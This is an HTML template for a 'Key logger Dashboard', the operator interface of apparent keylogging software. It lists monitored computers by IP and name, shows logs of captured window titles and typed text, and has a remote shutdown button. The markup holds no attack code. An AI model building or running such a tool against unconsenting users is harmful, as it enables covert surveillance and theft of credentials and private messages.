<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key logger Dashboard</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='index.css') }}">
    <link rel="icon" type="image/png" href="{{ url_for('static', filename='key_logger_icon.png') }}">
</head>
<body>
    <header>
        <h1>Key logger Dashboard</h1>
<!--        <button onclick="fetchLogs()">refresh data</button>-->
        <button id="logout">Logout</button>
        
    </header>

    <main>
        <!-- <aside>
            <h2>menu</h2>
            <ul>
                <li><a class="MenuItem" href="#">Dashboard</a></li>
                <li><a class="MenuItem" href="#">Activity analysis</a></li>
                <li><a class="MenuItem" href="#">settings</a></li>
            </ul>
        </aside> -->
        
        
        

        <section class="ComputersList" id="ComputersList">
            <div class="list-header">
                <h2>Computer List</h2>
                <button onclick="fetchLogs()">refresh data</button>
            </div>
            <table id="ComputersTable">
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>IP</th>
                        <th>Name</th>
                        <th>Active</th>
                    </tr>
                </thead>
                <tbody id="ComputersTableBody">
                    <!-- <tr><td>.</td></tr> -->
                </tbody>
            </table>
        </section>
        <div id="overlay"></div>


        <section class="ComputerActivity" id="ComputerActivity">
            <button id="closePopup" aria-label="Close">√ó</button>
            <h2>Computer Activity</h2>
        
            <div class="popup-content">
                <aside id="computerDetails">
                    <h3>Computer Info</h3>
                    <p><strong>ID:</strong> <span id="compId"></span></p>
                    <p><strong>IP:</strong> <span id="compIp"></span></p>
                    <p><strong>Name:</strong> <span id="compName"></span></p>
                    <div class="recording-indicator" id="indicator"></div>
                    <button id="stopListening" class="close-button">shutdown</button>

                </aside>
        
                <div class="activity-section">
                    <div class="date-range">
                        <label for="startDate">From</label>
                        <input type="date" id="startDate">
                    
                        <label for="endDate">To</label>
                        <input type="date" id="endDate">
                        <button id="updateActivity">üîÑÔ∏è</button>
                    </div>  

                    <!-- Activity Table Section -->
                    <div class="data-container">
                        <div class="container-title">Activity Log</div>
                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Time</th>
                                        <th>Window</th>
                                        <th>Text</th>
                                    </tr>
                                </thead>
                                <tbody id="ActivityTable">
                                    <!-- Data will be inserted here -->
                                </tbody>
                            </table>
                        </div>
                    </div>
                    
                    <!-- Activity Chart Section -->
                    <div class="chart-container" style="display: none;">
                        <div class="chart-title">Activity by Date</div>
                        <canvas id="activityChart" width="700" height="200"></canvas>
                    </div>
                </div>
            </div>
        </section>
        
  
    </main>
    
    <script src="{{ url_for('static', filename='index.js') }}"></script>
</body>
</html>
